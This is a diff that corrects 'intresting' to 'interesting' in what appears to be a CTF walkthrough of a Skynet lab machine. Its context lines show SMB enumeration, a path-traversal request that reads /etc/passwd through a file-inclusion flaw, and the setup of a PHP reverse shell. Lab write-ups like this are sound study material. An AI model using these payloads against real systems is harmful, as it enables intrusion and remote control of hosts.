@@ -68,7 +68,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 29.79 seconds
 ```
 
-Okay so we get some sort of searchbar which does not really do anything, so I decided to run a gobuster scan, which gave us some intresting results.
+Okay so we get some sort of searchbar which does not really do anything, so I decided to run a gobuster scan, which gave us some interesting results.
 
 ```
 /js                   (Status: 301) [--> http://10.10.123.244/js/]     
@@ -79,13 +79,13 @@ Okay so we get some sort of searchbar which does not really do anything, so I de
 /ai                   (Status: 301) [--> http://10.10.123.244/ai/]  
 ```
 
-All of them are forbidden except the ``/squirrelmail/`` which brings us to a login page, the source code doesnt look all that intresting.
+All of them are forbidden except the ``/squirrelmail/`` which brings us to a login page, the source code doesnt look all that interesting.
 
 I checked the hint for #1 it says 'enumerate SMB' so lets try that.
 
 `enum4linux 10.10.123.244`
 
-We get a couple intresting things back:
+We get a couple interesting things back:
 ```
 [+] Server 10.10.123.244 allows sessions using username '', password ''
 anonymous       Disk      Skynet Anonymous Share
@@ -131,7 +131,7 @@ Using the command `smbclient \\\\10.10.227.86\\milesdyson -U milesdyson` we get 
 3. Spend more time with my wife
 ```
 
-As the next question in the CTF is asking about a hidden directory, i guess it must be `/45kra24zxs28v3yd`, it is the correct answer but the directory does seem to be anything intresting...
+As the next question in the CTF is asking about a hidden directory, i guess it must be `/45kra24zxs28v3yd`, it is the correct answer but the directory does seem to be anything interesting...
 
 For the next question it asks what is it called when we include remote files, so that is `Remote File Inclusion` which I guess is what we have to do next.
 
@@ -241,7 +241,7 @@ Able to read sensitive information via File Inclusion (PHP Stream)
 ################################################################################################################                                                     
 ```
 
-So if we follow the instructions and go to: `/alerts/alertConfigField.php` we can see that it works so lets try reading sensitive data. So using `alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd` we can read the /etc/passwd file but nothing intresting is found so lets try a reverse shelll using pentest monkey, after getting the reverse shell from [Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) we can touch a revShell.php file and all we need to change is 
+So if we follow the instructions and go to: `/alerts/alertConfigField.php` we can see that it works so lets try reading sensitive data. So using `alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd` we can read the /etc/passwd file but nothing interesting is found so lets try a reverse shelll using pentest monkey, after getting the reverse shell from [Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) we can touch a revShell.php file and all we need to change is 
 
 ```
 $ip = '127.0.0.1';  // CHANGE THIS TO YOUR IP
